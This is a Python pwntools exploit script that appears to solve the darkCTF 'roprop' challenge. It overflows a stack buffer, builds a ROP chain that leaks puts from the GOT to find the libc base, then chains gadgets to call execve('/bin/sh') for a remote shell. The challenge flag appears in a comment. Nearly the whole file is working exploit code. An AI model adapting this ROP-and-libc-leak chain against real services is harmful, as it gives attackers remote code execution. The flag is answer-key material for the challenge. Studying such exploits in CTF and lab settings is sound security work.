#!/usr/bin/env python3
from pwn import *
import sys

def main(host, port):
    ## Open the binary
    ropelf = ELF('./roprop')

    ## Open libc
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    ## The first exploit needs to leak a pointer.
    ## This can be accomplished by a call to puts
    puts = p64(0x400660)

    ## We need to control rdi for the puts call
    ## 0x0000000000400963 : pop rdi ; ret
    pop_rdi = p64(0x0000000000400963)

    try:
        c = remote(host,port)
    except:
        print('[ERROR] Failed to connect {0}:{1}'.format(host, port))
        exit(1)

    input('...')

    ## Eat banner
    c.readline()
    c.readline()
    c.readline()
    c.readline()

    data = b'a'*0x50
    data += p64(0xdeadbeefcafebabe)            ## rbp
    data += pop_rdi                            ## first pc
    data += p64( ropelf.symbols['got.puts'])   ## leak this spot
    data += puts                               ## DO the leak 
    data += p64(ropelf.symbols['main'])        ## Jump back to main after the leak to 
    data += b'\n'

    c.send(data)

    ## Read until the newline, drop the nl and add enough 0s to reach 8
    data = c.recvuntil(b'\n', drop=True).ljust(8, b'\x00')
    
    ## Eat banner
    c.readline()
    c.readline()
    c.readline()
    c.readline()

    puts_addr = u64(data[:8])

    print('[INFO] Leaked puts: 0x%.08x' %(puts_addr))

    libc_base = puts_addr - libc.symbols['puts']
    
    ## set the libc base address
    libc.address = libc_base

    print('[INFO] LIBC base: 0x%.08x' %(libc_base))
    print('[INFO] /bin/sh: 0x%.08x' %(libc_base + 0x001b40fa))

    ## pointer to /bin/sh in libc
    binsh = p64(libc_base + 0x001b40fa)
    
    ## 0x0000000000023e8a : pop rsi ; ret
    pop_rsi = p64(libc.address + 0x23e8a)

    ## 0x0000000000001b96 : pop rdx ; ret
    pop_rdx = p64(libc.address + 0x1b96)

    data = b'a'*0x50
    data += p64(0xdeadbeefcafebabe)   ## rbp again
    data += pop_rdi
    data += binsh
    data += pop_rdx
    data += p64(0)
    data += pop_rsi
    data += p64(0)
    data += p64(libc.symbols['execve'])   ## system
    data += p64(libc_base + libc.symbols['exit'])     ## exit cleanly
    data += b'\n'

    c.send(data)

    c.interactive()
    c.close()
    exit(0)

    ## darkCTF{y0u_r0p_r0p_4nd_w0n}

    ''' 
    I did the leak remotely and saw that the lower 3 nybbles were the same offset as my local libc
    '''

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('[USAGE] %s <target> port>' %sys.argv[0])
        exit(1)

    main( sys.argv[1], int(sys.argv[2]))
